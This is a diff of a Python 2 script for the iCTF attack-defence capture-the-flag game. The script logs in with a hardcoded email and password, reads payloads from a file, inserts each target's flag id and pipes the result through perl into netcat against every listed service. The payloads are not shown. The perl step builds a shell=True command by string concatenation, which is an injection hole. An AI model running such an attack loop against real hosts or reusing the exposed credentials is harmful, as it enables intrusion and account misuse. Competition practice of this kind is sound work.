@@ -2,12 +2,16 @@
 
 import os
 import re
+import time
 import subprocess32
 from ictf import iCTF
 from scapy.all import *
 
 i = iCTF("http://35.167.152.77/")
 t = i.login("evanxia1018@gmail.com","B3Uy3rYgqza8")
+
+
+t.get_service_list()
 
 AD = open("AD.txt", 'r')
 strings = AD.readlines()
@@ -18,7 +22,6 @@ flagid = ""
 port = ""
 new = ''
 
-t.get_service_list()
 for l in t.get_service_list():
     print "=========="
     for k, v in l.iteritems():
@@ -36,11 +39,11 @@ for l in t.get_service_list():
                         port = q
                 toolong = False
                 for s in strings:
-                    new = s.replace('<<<>>>', flagid)
-                    print new
+                    s = s.replace('<<<>>>', flagid)
+                    print s
                     try:
                         out = subprocess32.Popen(
-                                'perl -e \'print"' + new + '"\'', 
+                                'perl -e \'print"' + s + '"\'',
                                 shell=True, stdout=subprocess32.PIPE
                                 )
                         reply = subprocess32.check_output(["nc", host, str(port)], timeout=2, stdin=out.stdout)
@@ -63,9 +66,3 @@ for l in t.get_service_list():
                 print '+++++++++++++++'
                 if flagfound:
                     continue
-
-
-
-
-
-
